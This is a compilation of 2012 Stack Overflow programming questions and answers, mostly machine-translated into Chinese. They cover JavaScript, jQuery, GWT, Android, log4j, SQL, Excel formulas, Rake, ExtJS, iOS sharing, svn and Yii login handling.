# java - RichTextEditor 中的光标位置

> ID：13491259
> 
> 赞同：1
> 
> 时间：2012-11-21T10:30:00.973
> 
> 标签：java, javascript, gwt, smartgwt

有什么方法可以在 RichTextEditor (SmartGWT) 中找到光标位置，以便将我正在创建的小部件添加到适当的位置？先感谢您！

# html - FileReader 在 Mac 版 Opera 12.11 中不起作用？

> ID：13491265
> 
> 赞同：0
> 
> 时间：2012-11-21T10:30:16.137
> 
> 标签：html, opera, filereader

我今天在 Opera 12.11 中尝试了 FileReader，突然它对我不起作用。无论如何，所有读取方法都会产生一个空字符串。尝试一些简单的事情：

```
<input id="file-picker" type="file" />​

...

$('#file-picker').change(function() {
    var fr = new FileReader();

    fr.onload = function() {
        console.info(this.result);        
    };

    fr.readAsDataURL(this.files[0]);

});​ 
```

这是一个快速的[jsFiddle](http://jsfiddle.net/HehZG/1/)。

嗯？

**更新：**它发生在 Mac 上。有人告诉我在Win7上没问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T11:23:16.920

我认为应该是：

```
fr.onload = function(e) {
  console.log(e.target.result)
} 
```

我一直都是这样。虽然没有在 Opera 上测试过

# javascript - jQuery - 创建插件的正确方法

> ID：13491270
> 
> 赞同：2
> 
> 时间：2012-11-21T10:30:43.670
> 
> 标签：javascript, jquery, jquery-plugins

我正在尝试将我的一些代码转换为可重用的插件。很多时候，我使用来自 Ajax 请求的动态选项填充选择。

我设法创造了这样的东西：

```
$.fn.fillSelect = function fillSelect(options) {
var self = this;
options = $.extend({
    type: "POST",
    contentType: "application/json; charset=utf-8",
    url: "Data.asmx/StatusList",
    dataType: "json",
    async: true,
    success: function(data) {
        var list = "";
        $.each(data.d, function(i) {
            list += '<option value='
                          + data.d[i].ID + '>'
                          + data.d[i].Nazwa
                          + '</option>';
        });
        self.filter("select").each(function() {
            $(this).empty();
            $(this).append(list);
            //use selectmenu
            if ($.ui.selectmenu) $(this).selectmenu();
        });
    }//,
    //error: function(result) {
    //    alert("Error loading data!");
    //}
}, options);
$.ajax(options);
return self;
} 
```

这背后的想法是能够通过一个请求多次使用相同的数据填充多个选择。
我有 Ajax 请求的默认选项，但我想为其添加更多选项。
例如：
clear - fill 确定我是否想要新选项来替换现有选项或追加。

此外，我想向我的函数添加一些回调，我可以将它们作为参数传递。如果例如服务器请求将失败，我想指定一个在此错误发生后将调用的函数 - 例如显示警报或禁用我的选择。

我的问题是我应该如何更改我的插件或我应该使用哪种模式（样板）？

我发现的每个样板都是用于创建将“留在”选定项目内的插件，以便以后可以调用该插件的方法。

我需要一个简单的插件，允许用户填写选择，然后它会结束它的生命:)

我的主要想法是对所有元素只向服务器发出一个请求。

* * *

**这是 jsfiddle 演示：http: [//jsfiddle.net/JC7vX/2/](http://jsfiddle.net/JC7vX/2/)**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T11:58:37.410

一个基本的插件可以如下构建

```
(function ($){
    $.fn.yourPlugin = function (options){
        // this ensures that function chaining can continue
        return this.each(function (){
            // merge defaults and user defined options
            var params = $.extend({},defaultOptions,options);
            // your plugin code
        });
    }

    /* these options will help define the standard functionality of the plugin,
     * and also serves as a nice reference
     */
    var defaultOptions = {
        someProperty : true
    }
})(jQuery) 
```

您可以做其他事情来扩展插件的功能并提供保留上下文的公共方法，但这对于您的示例来说太过分了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T20:28:53.630

这是我的答案版本[http://jsfiddle.net/Misiu/ncWEw/](http://jsfiddle.net/Misiu/ncWEw/)

我的插件看起来像这样：

```
(function($) {
$.fn.ajaxSelect = function(options) {
    var $this = this;
    //options
    var settings = $.extend({}, defaults, options);
    //disable select
    if ($.ui.selectmenu && settings.selectmenu && settings.disableOnLoad) {
        $this.selectmenu('disable');
    }
    //ajax call
    $.ajax({
        type: settings.type,
        contentType: settings.contentType,
        url: settings.url,
        dataType: settings.dataType,
        data: settings.data
    }).done(function(data) {
        var n = data.d || data;
        var list = "";
        $.each(n, function(i) {
            list += '<option value=' + n[i].Id + '>' + n[i].Nazwa + '</option>';
        });
        $this.filter("select").each(function() {
            $(this).empty();
            $(this).append(list);
            if ($.ui.selectmenu && settings.selectmenu) {
                $this.selectmenu();
            }
            settings.success.call(this);
        });
    }).fail(function() {
        settings.error.call(this);
    });

    return this;
};

var defaults = {
    type: "POST",
    contentType: "application/json; charset=utf-8",
    url: '/echo/json/',
    dataType: 'json',
    data: null,
    async: true,
    selectmenu: true,
    disableOnLoad: true,
    success: function() {},
    error: function() {}
};
})(jQuery); 
```

我知道它非常简单，但它具有我需要的所有功能：
-您可以一次选择多个元素
-它仅过滤您选择的项目中的选择
-它只向服务器发出一个请求
-首先它构建选项字符串和然后附加它而不是在循环中添加项目
- 您可以指定 2 个回调：一个用于错误，第二个用于成功

这是我的第一个插件，所以还有很多地方需要改进。

一如既往的欢迎评论和提示！

# java - 使用 Locale 和 ClientBundle 的 GWT 多租户支持

> ID：13491272
> 
> 赞同：1
> 
> 时间：2012-11-21T10:31:00.520
> 
> 标签：java, gwt, internationalization, multi-tenant, clientbundle

我正在尝试为我现有的 GWT 应用程序带来多租户功能。要求如下

1.  使用公司特定的 CSS 和图像
2.  文字改动不大
3.  对实际应用程序逻辑的一些更改

目前，我的应用程序有一个 ClientBundle，其中包括所有图像和 CSS，并通过静态常量访问：

```
public interface MyRes extends ClientBundle {
    public static final MyRes RES =  GWT.create(myRes.class);
    ...
}
Image image = new Image(MyRes.RES.myLogo()); 
```

我的文本都在一个大型 Java 属性文件中，该文件被解析为[GWT 消息接口](http://google-web-toolkit.googlecode.com/svn/javadoc/latest/com/google/gwt/i18n/client/Messages.html)。

我的想法是为文本设置不同[的语言环境并通过 URL 参数确定语言环境](https://developers.google.com/web-toolkit/doc/latest/DevGuideI18nLocale#LocaleSpecifying)。我仍然不确定如何根据公司加载不同的 ClientBundle。我是否需要创建一个抽象 ClientBundle 并将其继承到 CompanyA 和 CompanyB ClientBundles 中？

我的主要问题是，这是否是一个好的解决方案，或者是否还有其他我优雅的方式。

# android - DroidGap：如何获取网页？

> ID：13491274
> 
> 赞同：2
> 
> 时间：2012-11-21T10:31:01.387
> 
> 标签：android, cordova

我的来源：

```
 public class MainActivity extends DroidGap {
    @Override
        public void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            super.loadUrl("file:///android_asset/www/index.html");
    }

    @Override
        public boolean dispatchTouchEvent(MotionEvent e) {
            super.dispatchTouchEvent(e);
    // Now what page ??

            return true;
        } 
```

如何获取当前网页？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:57:00.293

创建一个外部 javascript 文件，在其中写入以下代码：

```
<script>
document.getElementByTagName("body").addEventListener('touchstart',touchPagePressed);// you can use 'onclick' also
function touchPagePressed()
{
   alert(touchPagePressed');
   var sPath=window.location.pathname; 
   var sPage = sPath.substring(sPath.lastIndexOf('/') + 1); 
   alert(sPage); 
   MyAndroid.performClick(sPage);
}
</script>
```

在每个 html 页面中包含该外部 js 文件。

在此之后，在您的 onCreate 方法中编写以下代码：

```
public class MainActivity extends DroidGap {
@Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        super.loadUrl("file:///android_asset/www/index.html");

        WebView webView = (WebView) findViewById(R.id.webView);
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webView.addJavascriptInterface(new Object()
             {
                public void performClick(String currentPageName)
                {
                   // Deal with a click on the body tag
                   System.out.println("PageName- "+currentPageName);  
                }
             },"MyAndroid");
}
} 
```

# java - ConversionPattern 用于按数字顺序排列日志消息

> ID：13491276
> 
> 赞同：0
> 
> 时间：2012-11-21T10:31:03.780
> 
> 标签：java, log4j

我在我的应用程序中实现 Log4j，如果我希望日志消息像 1,2,3 这样按顺序编号，那么我需要附加到这个字符串

```
log4j.appender.file.layout.ConversionPattern = ? | %-7p | %-30F | %-5L | %-90m | %d %n 
```

“？”处的字符串 我能写什么，所以我的消息将带有序列号。

问候马尤尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:39:59.737

你有两个选择：

*   `%r`是自 log4j 启​​动以来的毫秒数
*   `%d{ISO8601}`您可以使用或您自己的自定义格式创建可排序的日期。

**[编辑]**要按顺序对日志消息进行编号，您需要编写自己的`PatternLayout`. 覆盖该方法`createPatternParser()`以能够使用自定义模式，例如`%S`.

在`PatternParser`中，覆盖`finalizeConverter()`以添加您自己的`PatternConverter`when `c == 'S'`：

```
protected
void finalizeConverter(char c) {
     if( 'S' == c ) return SequentialConverter.INSTANCE;
     else return super.finalizeConverter(c);
} 
```

`SequentialConverter`需要有一个静态计数器。然后，您可以覆盖`format()`以将计数器添加到日志消息中：

```
public
void format(StringBuffer sbuf, LoggingEvent e) {
    sbuf.append( counter );
} 
```

# visual-studio-2012 - 在 Visual Studio 2012 中添加外键

> ID：13491286
> 
> 赞同：6
> 
> 时间：2012-11-21T10:31:31.220
> 
> 标签：visual-studio-2012, database-first

我正在 Visual Studio 2012 中开发我的第一个 MVC 项目。因为我更喜欢“数据库优先”的方法，所以我开始设计数据库。问题是：为什么当我想添加外键时，我禁用了所有键属性以进行编辑（左）：

![在此处输入图像描述](../Images/087acade78b10c32ed575307604942a5.png)

我只能直接修改脚本（对），但这真的是唯一的解决方案吗？还是我做错了什么？

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-04-12T13:48:11.510

您需要做的就是右键单击表格视图右侧的外键选项，然后选择添加新外键。然后在 T-SQL 窗口中您需要手动编辑外键和外键表。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-28T08:33:58.573

也许您需要手动添加关系？它可以让你随心所欲地改变它。

# struts2 - 从AJAX调用到Action类，然后到一个jsp页面，该页面将html作为struts2中的响应返回给AJAX

> ID：13491287
> 
> 赞同：0
> 
> 时间：2012-11-21T10:31:35.910
> 
> 标签：struts2

我对 struts 很陌生。这就是我想要实现的目标。

用 JSP-1 编写的 JavaScript 函数触发一个 AJAX，它使用动作类从数据库中获取数据，而 jsp-2 使用动作类中的数据并使用 struts 标签形成某些元素，并将此 HTML 数据输出到 JavaScript 函数，该函数将 HTML 数据添加到JSP-1。

![在此处输入图像描述](../Images/3440e2cb5ac3cda88266093c49fe0d10.png)

现在，我使用 JSP-2 的原因是使用 struts 标签制作 HTML 数据。JSP-2 就像一个函数，它为 JSP-1 形成永远不会显示的 HTML 数据。我知道动作类将 JSON 对象返回给 ajax 的正常流程，但我无法弄清楚如何处理中间 JSP-2 页面。

这是我的 struts.xml for jsp to action 和 action to ajax flow。

```
<action name="ajaxAction" class="ActionClass">
            <result name="success" type="json"/>
 </action> 
```

我的问题是如何从动作类转到 JSP-2 再响应 AJAX ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T11:19:01.753

如果您使用的是 jquery，您可以这样做

```
$(document).ready(function(){
    var url ="MyAjaxAction.action";
    $("#sectionWhereJSP2WillbeThere").load(url);  
 }); 
```

在你的struts动作类中，只需使用正常`success`（即视为正常动作）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T11:17:23.420

所以不要使用`dispatcher`结果类型`json`：

```
<action name="ajaxAction" class="ActionClass">
   <result name="success">JSP-2</result>
</action> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T15:14:13.103

无需考虑 JSP-1。它只是您的 Ajax 应用程序的交付机制。问题是您提出的 Ajax 请求需要什么样的响应。您的 Javascript Ajax 客户端需要 JSON 响应还是 HTML 片段？

如果它需要 json，那么我认为不需要 JSP-2（尽管您可以使用 jsp 创建 json ——但是当 struts 提供 json 结果类型为您执行此操作时，几乎没有理由这样做）。

如果它需要一个 HTML 片段，那么创建它的最佳方法是使用 JSP，大概是您的 jsp-2。如果是这种情况，您需要将结果类型更改为“dispatcher”，这实际上是默认类型，即您不需要指定它。

```
<action name="ajaxAction" class="ActionClass">
            <result name="success">/path/to/jsp-2</result>
 </action> 
```

# mysql - MySQL联盟情况

> ID：13491290
> 
> 赞同：0
> 
> 时间：2012-11-21T10:31:46.680
> 
> 标签：mysql, database

我正在尝试学习数据库（特别是 MySQL），并且正在复习我购买的教科书中的问题（没有提供解决方案手册）。我已经实现了一个问题的 A 部分，但我很困惑如何做 B 部分。 B 部分要求获得与 A 部分相同的结果，除了使用 UNION。我想知道是否有人可以解释？

提前致谢

我认为A部分的答案：

```
SELECT Country, COUNT(City) from country LEFT OUTER JOIN city 
ON city.CountryId = country.CountryId group by Country; 
```

B 部分：将 A 部分的查询写成 UNION？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:40:03.297

试试这个

```
select country from country group by country
 union
select count(city) from city group by city 
```

使用“联合”时，您不会在单独的列中获得结果。您将在同一列中获得结果

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:56:33.137

```
select c1.countrynm,count(c2.citynm) 
from country c1 
join city c2
on c2.countryid=c1.countryid
group by c1.countrynm
union select countrynm,0 from country where 7=3;

mysql> select c1.countrynm,count(c2.citynm)
-> from country c1
-> join city c2
-> on c2.countryid=c1.countryid
-> group by c1.countrynm
-> union select countrynm,0 from country where 7=3;
+-----------+------------------+
| countrynm | count(c2.citynm) |
+-----------+------------------+
| France    |                2 |
| Germany   |                1 |
+-----------+------------------+ 
```

# jquery - 具有多个搜索和类别的 jquery 自动完成需要项目和值

> ID：13491292
> 
> 赞同：1
> 
> 时间：2012-11-21T10:31:48.693
> 
> 标签：jquery, search, autocomplete

我在我的页面中使用带有类别的 Jquery 多项选择。我想包括项目名称和值..我在搜索时找到了代码，但这不是自动完成类别插件...有人可以帮我吗？

# range - Excel：在单元格内的多个数组中搜索值

> ID：13491293
> 
> 赞同：2
> 
> 时间：2012-11-21T10:31:51.983
> 
> 标签：range, excel-formula

我正在尝试在两个系统之间设置错误检查，并且需要比较不同格式的周数。一个系统以文本格式生成周数，例如“ `8-15, 18, 31-32`”，而另一个系统生成离散值。我如何查看一个值（例如 16）是否落入上述多个范围内？

这是一个更大问题的一部分，我正在检查一个系统中的参考编号、日期、时间和周数（例如`XXX111 Weds 9:00 9`）与另一个系统的输出（例如`XXX111 Wed 9:00 7:11, 13, 16, 52-63 or XXX111 Thu 9:00 5, 6, 11-16`）。尽管进行了很多搜索，但我还是遇到了上述问题，因此我们将不胜感激。

`VBA`如果可能，我宁愿不使用。提前感谢您的智慧。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T19:26:08.310

假定：

1.  `7:11`应该`7-11`
2.  `63`应该`53`
3.  不属于范围的数字（例如`18`）不是问题
4.  范围为文本格式

我希望以下内容有所帮助，或者至少是“朝着正确方向迈出的一步”：

**A 解析组件**

例如`8-15, 18, 31-32`，粘贴到单元格（例如`A1`）和数据>数据工具-文本到列>分隔>下一步>检查逗号，空格并将连续分隔符视为一个>下一步>根据需要选择列>为每个选择文本>完成

处理单列可能更容易，因此选择数据，复制 > 选择`A2`> 选择性粘贴 > 转置 > 确定并删除`Row1`.

**B 将您的搜索值 ( `16`) 添加到`B1`**

**C 把下面的公式复制进去`B2`，按要求复制下来：**

`=AND(B$1>=VALUE(LEFT($A2,SEARCH("-",$A2)-1)),B$1<=VALUE(RIGHT($A2,LEN($A2)-SEARCH("-",$A2)))))`

结果应该是`TRUE`搜索值在离散范围之内或之内的位置：

![SO13491293 示例](../Images/7f432994e386c8e53747980c28d121ae.png)

该公式使用连字符来“识别”一个离散范围。SEARCH 查找它的位置（因为它的两侧可能有一个或两个字符）。LEFT 和 RIGHT 用于下限和上限（在 RIGHT 与 LEN 一起使用的情况下，以解决上限是一个字符还是两个字符）。需要 VALUE 才能将 Text 转换为可以等同于搜索值的内容。AND 用于在确定是否“在范围内”时考虑两个边界的过程。

“如果可能，我宁愿不使用 VBA”——但可能是可取的！

但是，使用一些固定引用 ($) 应该比使用标准公式更容易，因为`ColumnA`可以通过将公式复制到右侧/根据需要向下并输入（作为*数字*格式）在`Row1`.

# ruby - 使用 include Rake::DSL 的 10.0.1 中的 Rake 脚本中断

> ID：13491295
> 
> 赞同：0
> 
> 时间：2012-11-21T10:31:54.027
> 
> 标签：ruby, rake

我有许多包含通用模块的 rake 文件：

```
require 'rake'

module RakeCommon
  include Rake::DSL
  task :clean do 
```

在 rake 文件中：

```
include RakeCommon 
```

问题是更新到 rake 10.0.1 后，出现以下错误：

```
undefined method `task' for RakeCommon:Module 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:55:55.073

就像我在评论中所说的那样，但只是检查了一下。

你应该在你的模块中使用`extend`而不是。`include`您的代码更早工作，因为`Rake::DSL`模块正在扩展`Object`. 无论您是否正确包含或扩展它，您使用的方法都可以在模块中使用。在 10.0 分支中删除了一些不推荐使用的东西，这就是它不起作用的原因。

# android - 启用/禁用接收 gcm 通知的最佳程序是什么？

> ID：13491297
> 
> 赞同：1
> 
> 时间：2012-11-21T10:31:58.053
> 
> 标签：android, push-notification, google-cloud-messaging

我想在我的应用程序中实现 gcm，并在启动时向用户显示一个对话框，询问他是否想接收通知。

我想做的程序：

```
AlertDialog question -> yes or no
Store answer in SharedPreferences
if(true) { register procedure etc }
rest of code 
```

这是这样做的方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:34:35.293

您应该添加一个首选项以允许用户随时改变主意。此外，在启动时显示对话框会使您的应用程序启动变得臃肿和无聊。它应该尽快启动并可用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:34:46.797

是的，这就是它应该如何实现的，如果用户想从推送服务中注销，你应该简单地调用：GCMRegistrar.unregister(context)

# iphone - iTunes Connect 中的贝宝？

> ID：13491299
> 
> 赞同：1
> 
> 时间：2012-11-21T10:32:10.360
> 
> 标签：iphone, paypal, app-store-connect, banking

与编程无关，但它与向苹果提交应用程序有关，所以我将在这里发布这个问题：

我在网上搜索了一段时间，没有找到关于这个的讨论；苹果会把钱存入Paypal账户吗？例如。如果我在 Itunes connect 中添加一个 paypal 账户，苹果会认为这是一个有效的银行账户，并将所有收入都像普通银行账户一样存入吗？

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-18T17:40:36.553

不可以。无法使用 Paypal 接收来自 Apple 的付款。

请参阅[iTunes Connect 常见问题解答](https://itunesconnect.apple.com/WebObjects/iTunesConnect.woa/wo/2.0.0.9.1.9.1.1.8.1)

> **如何付款？**
> 所有付款均通过电子转帐方式进行。如果可用，则通过低价值 ACH 发送付款，而不是高价值电汇。Apple 的银行将在可能的情况下合并不同财务报告的付款，通常会导致每个月的所有收入都一次性付款，满足付款要求。
> 
> 使用的付款方式（电汇/ACH）显示在“付款”页面上付款显示的底部。

# javascript - 有 getForm().createRecord() 方法吗？

> ID：13491303
> 
> 赞同：0
> 
> 时间：2012-11-21T10:32:34.900
> 
> 标签：javascript, extjs, extjs4

有没有类似的

```
form.getForm().createRecord(); 
```

因为有`form.getForm().updateRecord([record]);`

我不想要`form.getForm().submit()`，因为我必须指定`url`属性但是当我使用`.updateRecord`它时使用商店：

```
api: {
  create: 'link',
  update: 'link',
  delete: 'link',
  destroy: 'link',

} 
```

`.updateRecord()`除了创建新记录而不是更新之外，还有什么类似的吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:43:25.517

如果您想创建一条记录，您可以实例化您的模型并将其添加到您的商店，然后同步它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T10:44:48.277

做

```
form.getForm().loadRecord(Ext.create('YourModelName')); 
```

打开表格后。

**编辑** *只是为了完整性*

完成所有编辑后获取记录

```
var rec = form.getForm().getRecord(); 
```

该记录很可能有脏字段并被标记为幻像（服务器未知）您现在有两个选项

如果 Model 有使用**[save()分配的代理，则直接同步它](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.data.Model-method-save)**

```
rec.save(); 
```

或将其添加到@JohanHaest 已经提到的商店

```
storeRef.add(rec);
storeRef.sync(); 
```

# javascript - 隐藏多个div的功能

> ID：13491306
> 
> 赞同：1
> 
> 时间：2012-11-21T10:32:46.937
> 
> 标签：javascript, function, html, hide

我希望，有人可以解释我的代码哪里错了......所以我有这个功能：

```
function divdisplay(element){
  if(document.getElementById(element).style.display == 'none'){
     document.getElementById(element).style.display = 'block';
     for (var i=0; i<NUMBER_OF_DIVS; i++)
       document.getElementById(i).style.display = 'none';
  } else
     document.getElementById(element).style.display = 'none'; 
```

该函数可以很好地显示 div，但隐藏部分是问题所在。我想隐藏其他几个`<divs>`。这些`ids`其他`<divs>`的都是简单的数字，这就是为什么我尝试用变量来处理这些元素`i`。但是当我在#2 已经可见的情况下单击`<div>`#1 时，只出现#1 而#2 并没有消失。看起来像这样：`<div>``<div>``<div>``<divs>`

```
 <div id="1" style="display:none;">
      <a href="javascript:divdisplay(1);">
        <img src="..."/>
      </a>
    </div>

    <div id="2" style="display:none;">
      <a href="javascript:divdisplay(2);">
        <img src="..." />
      </a>
    </div>

    <div id="3" style="display:none;">
      ... 
```

并且它们第一次出现的时候对应的链接

```
 <a href="javascript:divdisplay(1);">
    <a href="javascript:divdisplay(2);">
    <a href=... 
```

被点击。

每个`<div>`中的图像再次链接到该功能，因此单击其中的图像`<div>`再次隐藏它，但单击另一个链接不会使可见`<div>`再次消失。我哪里做错了？

无论如何提前谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:37:32.447

为什么不使用 Jquery？您只需为要隐藏/显示的每个 div 添加一个类

```
<div class="test">content here</div> 
```

现在您可以使用`show()`和`hide()`来自 jquery。

`$(".test").show();`并将`$(".test").hide();`显示/隐藏所有 div 类`test`。

您还可以查看[show()](http://docs.jquery.com/Show)和[hide()](http://docs.jquery.com/Hide)。

此外，您还有机会为您的`show()`和`hide()`功能添加效果。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:38:18.413

这个函数循环遍历你所有的 div 并且只显示你指定的那个`element`

```
function divdisplay(element){
    for (var i=0; i<NUMBER_OF_DIVS; i++){
        var div = document.getElementById('div'+i);
        if(i == element){
            div.style.display = 'block';
        }else{
            div.style.display = 'none';
        }
    }
}
// As Alnitak suggested, this can be condensed into:
function divdisplay(element){
    for (var i=0; i<NUMBER_OF_DIVS; i++){
        document.getElementById('div'+i).style.display = (i == element)? 'block' : 'none';
    }
} 
```

我不喜欢在像这样的小函数中使用 jQuery，因为它可以让您免于加载库（-1 HTTP 请求），并且本机功能更快。（在这么多的代码中并不重要，但仍然如此）
假设您还没有使用 jQuery，也就是说。如果你是，这将工作：

假设您向所有元素添加一个类，如下所示：

```
<div class="hideMe" id="1" style="display:none;">
  <a href="javascript:divdisplay(2);">
    <img src="..." />
  </a>
</div> 
```

jQuery：

```
function divdisplay(element){
     $(".hideMe").hide();
     $("#"+element).show();
} 
```

# ios - 如何在 IOS6 中更改原生 Facebook 共享上的“通过 iOS”

> ID：13491309
> 
> 赞同：2
> 
> 时间：2012-11-21T10:32:52.933
> 
> 标签：ios, facebook

嗨，我正在使用以下代码使用 IOS6 本机库共享消息

```
if([SLComposeViewController isAvailableForServiceType:SLServiceTypeFacebook])
    {
        SLComposeViewController *mySLComposerSheet = [SLComposeViewController composeViewControllerForServiceType:SLServiceTypeFacebook];
        [mySLComposerSheet setInitialText:@"Good morning all"];
        //[mySLComposerSheet addImage:[UIImage imageNamed:@"img1.png"]];
        [mySLComposerSheet addURL:[NSURL URLWithString:@"http://www.google.com/"]];
        [self.superViewController presentViewController:mySLComposerSheet animated:YES completion:nil];
        [mySLComposerSheet setCompletionHandler:^(SLComposeViewControllerResult result) {
            NSString *output = @"";
            switch (result) {
                case SLComposeViewControllerResultCancelled:
                    output = @"ACtionCancelled";
                    break;
                case SLComposeViewControllerResultDone:
                    output = @"Post Successfull";
                    break;
                default:
                    break;
            }
            UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Facebook Message" message:output delegate:nil cancelButtonTitle:@"Ok" otherButtonTitles:nil];
            [alert show];
        }];
    } 
```

它已成功发布但在我的 facebook 中它通过 IOS 显示，但我想显示我的应用程序名称。我在 Facebook 开发者专区创建应用程序 ID 时遵循了所有步骤

> 如何将IOS更改为我的应用程序名称？ ![在此处输入图像描述](../Images/31cdbbb0247b1afbf1482308415306f0.png)

我也试过这段代码[http://www.developers-life.com/facebook-compose-view.html](http://www.developers-life.com/facebook-compose-view.html)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T13:15:51.233

使用`SLComposeViewController`时无法更改“via”名称，它将始终显示“iOS”作为来源。

您需要使用 Facebook iOS SDK 并设置自己的自定义撰写视图，而不是使用本机 SLComposeViewController。

**更新**

Facebook 的 3.5+ SDK 提供了许多出色的解决方案，例如[Share Dialog](https://developers.facebook.com/docs/ios/share-dialogs-ios-sdk/#sharedialog)，它使用原生 Facebook 和开放图。

# windows - SVN：创建从特定版本到头部的补丁

> ID：13491311
> 
> 赞同：0
> 
> 时间：2012-11-21T10:33:03.713
> 
> 标签：windows, svn

我有一台从网络脱机的计算机，但与网络上的计算机共享一些 svn 目录。

大约每月一次，我需要使用存储库中发生的更改来更新离线计算机上的目录。我这样做的当前方法是压缩目录，在 cd 上刻录并在离线计算机上解压缩。

我认为必须有一种更简单的方法来做到这一点，所以我想获取上次更改的所有文件，然后只压缩这些文件。但是我会错过更改已删除文件的机会。

所以我有办法创建一个从修订版到头版的补丁吗？我已经搜索过，但没有发现任何有用的东西。

两台电脑都运行win7。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:38:40.783

如果您知道上次更改的修订版，则可以运行
`svn diff -r revision:HEAD`

获取所有文件的更改列表。

您可以添加 --summarize 来单独获取文件列表（没有实际差异）

```
svn diff --summarize -r revision:HEAD 
```

然后可以将其通过管道传输到 zip 命令中，以获取已更改的文件。

参考[SVNBook](http://svnbook.red-bean.com/en/1.7/svn-book.html#svn.ref.svn.c.diff)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:39:21.780

如果存储库不是太大并且可以完全放在 USB 记忆棒/CD 上，您可以这样做：

1.  在 USB 记忆棒/CD 上创建 repo 的副本。
2.  将 U 盘插入离线计算机，然后使用`file:///`模式（[文档](http://svnbook.red-bean.com/en/1.7/svn-book.html#svn.basic.in-action.wc.tbl-1)）直接从 U 盘上的存储库中 svn 签出文件。
3.  每月，再次执行相同的过程，而不是从 USB 存储库中签出，只需插入 USB 记忆棒并运行`svn update`. 如果您已将最新版本的 repo 复制到 U 盘上的同一目录中，则更新应该可以正常运行。

# c# - 如何建立结构

> ID：13491318
> 
> 赞同：0
> 
> 时间：2012-11-21T10:33:46.287
> 
> 标签：c#, wpf, mvvm

我对我的项目有一个“结构”问题。假设我想要这个结果 [http://msdn.microsoft.com/de-de/library/vstudio/ff407126.aspx](http://msdn.microsoft.com/de-de/library/vstudio/ff407126.aspx)，一个带有“项目”的DataGrid，每个项目都有几个任务。

我已经有一个 MainWindowViewModel + MainWindowView 显示带有标题行的 DataGrid。

对于每个项目，我都有一个包含多个任务对象的项目对象。

我现在如何将 DataGrid 拆分为多个 ViewModel/View？

问题是，稍后我将有不同类型的任务，并且网格的布局将仅针对此任务略有不同。（例如没有进度条或不同的颜色/文本绑定

我是否需要每个项目的 SchedulerViewModel(+View) 和 ProjectViewModel(+view) 以及每个任务的 TaskViewModel(+View)？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T16:34:07.240

你会想要使用[模板](http://msdn.microsoft.com/en-us/library/ms742521.aspx)。DataGrid 的 ItemsSource 属性应指向您的 Project 对象集合。然后，您需要为 DataGrid 的 ItemTemplate 属性分配一个模板，描述“Project”对象的外观。“项目”行的模板很可能是某种 ItemContainer；这个 ItemContainer 又将它自己的 ItemsSource 属性设置为项目的任务集合，这又将具有它自己的项模板，您可以通过它来描述任务的外观。

# login - How to make entry of user when password is wrong

> ID：13491319
> 
> 赞同：0
> 
> 时间：2012-11-21T10:33:46.747
> 
> 标签：login, yii

In yii i am creating login module. I want to give access to users only if username and passwords are correct and need to store this user's id into 'Success' table. But when only username is correct and password is wrong,i want to store that user's id into 'attempt' table in order to give only 3 chance to him for entering correct password. But when i am implementing this,when password is wrong entry doesnt get enterd into attempt table. i had created ActionLogin() method as-

```
public function actionLogin()
{
    $model=new LoginForm;
    $command = Yii::app()->db->createCommand();

    // if it is ajax validation request
    if(isset($_POST['ajax']) && $_POST['ajax']==='login-form')
    {
        echo CActiveForm::validate($model);
        Yii::app()->end();
    }

    // collect user input data
    if(isset($_POST['LoginForm']))
    {
         $model->attributes=$_POST['LoginForm'];
         // validate user input and redirect to the previous page if valid
         if ($model->validate()) 
         {
            if($model->login()) {
                      $command->insert('attempt', array(
                      'id'=>Yii::app()->user->getId(),
                       ));
                      $this->redirect(Yii::app()->user->returnUrl);
             }  
            if(!$model->login())
            {            
            $command->insert('attempt', array(
            'id'=>Yii::app()->user->getId(),
                   ));
             } 
            }
     }

    // display the login form
    $this->render('login',array('model'=>$model));
} 
```

What changes i need to do in order to make entry of user's id into attempt table when password is wrong. Please help me.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T16:22:42.023

如评论中所述：

访问基于 Yii 的网站的用户没有分配用户 ID，只有登录用户分配了用户 ID（这是有道理的......）。

最好的方法是对登录尝试进行基于 IP 的检查。您可以通过以下代码检索用户的 IP：

```
Yii::app()->request->userHostAddress 
```

这个答案也归功于@Stu 和@Nikos-Tsirakis

# visual-studio - Combining graphic-card and parallel-computation libraries in C++

> ID：13491321
> 
> 赞同：1
> 
> 时间：2012-11-21T10:33:55.567
> 
> 标签：visual-studio, qt, opengl, cuda, opencl

